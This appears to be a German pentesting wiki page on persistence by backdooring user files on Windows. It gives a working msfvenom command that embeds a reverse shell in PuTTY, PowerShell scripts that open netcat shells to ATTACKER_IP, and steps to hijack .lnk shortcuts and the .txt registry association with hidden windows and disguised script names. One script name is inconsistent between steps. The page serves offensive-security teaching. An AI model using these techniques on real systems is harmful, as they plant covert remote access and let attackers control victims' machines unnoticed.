# Hintertüren in Dateien

{% hint style="info" %}
**Persistenz durch Manipulation benutzerinteragierter Dateien**

Durch unauffällige Änderungen an häufig genutzten Dateien können Backdoors installiert werden, die bei Nutzung automatisch ausgeführt werden, ohne dass die Funktionalität für den Benutzer beeinträchtigt wird.
{% endhint %}

## Ausführbare Dateien

Ein Ansatz zur Herstellung von Persistenz besteht darin, häufig genutzte ausführbare Dateien des Benutzers gezielt zu manipulieren. Findet sich beispielsweise eine Verknüpfung zu einer Anwendung wie PuTTY auf dem Desktop, lässt sich anhand der Eigenschaften feststellen, auf welche ausführbare Datei diese verweist. Diese Datei kann dann kopiert, mit einem Payload versehen und in ihrer Funktionalität beibehalten werden.

Mit _msfvenom (_ [metasploit.md](../../../../programme-skripte/metasploit.md "mention")) lässt sich ein benutzerdefinierter Payload in eine bestehende `.exe`-Datei einbetten, ohne deren ursprüngliche Funktion zu beeinträchtigen. Durch das Hinzufügen eines zusätzlichen Threads wird der Schadcode im Hintergrund ausgeführt, während das Programm weiterhin wie gewohnt arbeitet. Ein Beispiel für einen solchen Angriff wäre die Erstellung einer modifizierten PuTTY-Version mit folgendem Befehl:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

Die daraus resultierende `puttyX.exe` startet unbemerkt eine _reverse\_tcp meterpreter_-Sitzung ([shells-reverse-shells.md](../../../../informationen/shells-reverse-shells.md "mention")) beim Benutzer. Diese Methode bietet eine effektive Möglichkeit zur Persistenz, auch wenn es noch unauffälligere Techniken gibt.

***

## Dateiverknüpfung (Shortcut-File)

Eine weitere Methode zur Herstellung von Persistenz, ohne die ursprüngliche ausführbare Datei zu verändern, besteht in der Manipulation von Verknüpfungsdateien (.lnk). Anstatt die Verknüpfung direkt auf die erwartete Anwendung verweisen zu lassen, sollte sie auf ein Skript umgeleitet werden, das zunächst eine Backdoor startet und anschließend das ursprüngliche Programm aufruft, um keinen Verdacht zu erregen.

Dazu ist wie folgt vorzugehen:

1. **Ziel der Verknüpfung analysieren:**\
   Es sollte geprüft werden, wohin die bestehende Verknüpfung zeigt (z. B. über die Eigenschaften der Datei „calc.lnk“ auf dem Desktop des Administrators).
2.  **Skript erstellen:**\
    An einem unauffälligen Ort im Dateisystem (z. B. `C:\Windows\System32`) sollte ein PowerShell-Skript erstellt werden, das eine Reverse Shell öffnet und danach das eigentliche Programm startet. Ein Beispielinhalt des Skripts könnte folgendermaßen aussehen:

    ```powershell
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
    Start-Process "C:\Windows\System32\calc.exe"
    ```
3.  **Verknüpfung manipulieren:**\
    Anschließend sollte die Verknüpfung so angepasst werden, dass sie nicht mehr auf die ursprüngliche ausführbare Datei, sondern auf das erstellte Skript verweist. Um eine sichtbare Veränderung für den Benutzer zu vermeiden, ist darauf zu achten, dass das Icon der Verknüpfung weiterhin auf die ursprüngliche Datei zeigt. Zusätzlich sollte das Skript im Hintergrund ausgeführt werden. Der Zielpfad der manipulierten Verknüpfung könnte wie folgt lauten:

    ```powershell
    powershell.exe -WindowStyle hidden C:\Windows\System32\sysmon_updt.ps1
    ```

Durch diese Technik wird beim Öffnen der scheinbar unveränderten Verknüpfung unbemerkt ein Schadcode ausgeführt, während die erwartete Anwendung weiterhin wie gewohnt startet.

***

## Hijacking von Dateizuordnungen

Neben der Manipulation ausführbarer Dateien oder Verknüpfungen bietet auch das Hijacking von Dateizuordnungen eine effektive Möglichkeit zur Erlangung von Persistenz. Dabei wird die Zuordnung bestimmter Dateitypen zu ihren Standardanwendungen so verändert, dass beim Öffnen dieser Dateien zusätzlich ein Schadcode ausgeführt wird.

Das Betriebssystem speichert die Standard-Dateizuordnungen in der Windows-Registrierung unter dem Pfad:

```
HKLM\Software\Classes\
```

Für jeden Dateityp existiert ein Unterschlüssel (z. B. `.txt`), der einem sogenannten _Programmatic Identifier_ (ProgID) zugeordnet ist – im Fall von `.txt`-Dateien üblicherweise `txtfile`. Dieser ProgID verweist auf ein weiteres Registry-Objekt unter demselben Pfad, beispielsweise:

```
HKLM\Software\Classes\txtfile\
```

<figure><img src="../../../../.gitbook/assets/grafik (11) (1).png" alt=""><figcaption></figcaption></figure>

Dort befindet sich unter `shell\open\command` der Befehl, den das System beim Öffnen einer Datei dieses Typs ausführt. Für `.txt`-Dateien lautet dieser in der Regel:

```
%SystemRoot%\system32\NOTEPAD.EXE %1
```

<figure><img src="../../../../.gitbook/assets/grafik (12) (1).png" alt=""><figcaption></figcaption></figure>

Um diese Zuordnung zu kompromittieren, sollte folgendermaßen vorgegangen werden:

1.  **Skript vorbereiten:**\
    Ein PowerShell-Skript sollte erstellt und an einem unauffälligen Ort abgelegt werden, z. B. unter `C:\Windows\backdoor2.ps1`. Dieses Skript führt zunächst einen Reverse Shell Payload aus und ruft anschließend die ursprüngliche Anwendung mit der übergebenen Datei auf. Der Inhalt des Skripts könnte folgendermaßen aussehen:

    ```powershell
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
    C:\Windows\system32\NOTEPAD.EXE $args[0]
    ```

    Dabei ist `$args[0]` notwendig, da es dem übergebenen Dateinamen (`%1`) entspricht.
2.  **Registry-Eintrag ändern:**\
    Der Standardwert unter dem Schlüssel `HKLM\Software\Classes\txtfile\shell\open\command` sollte nun so angepasst werden, dass anstelle von Notepad das zuvor erstellte Skript ausgeführt wird. Um eine unauffällige Ausführung zu gewährleisten, sollte PowerShell im versteckten Fenstermodus gestartet werden. Der neue Befehl könnte wie folgt aussehen:

    ```
    powershell.exe -WindowStyle hidden C:\Windows\System32\sysmon_updt.ps1 "%1"
    ```

<figure><img src="../../../../.gitbook/assets/grafik (13) (1).png" alt=""><figcaption><p>Ausführung eines Skripts beim Öffnen der Datei mit Endung (hier .txt)</p></figcaption></figure>

Durch diese Änderung wird beim Öffnen einer `.txt`-Datei der Schadcode im Hintergrund ausgeführt, während Notepad wie gewohnt geöffnet wird – für den Benutzer bleibt der Vorgang somit unverdächtig.
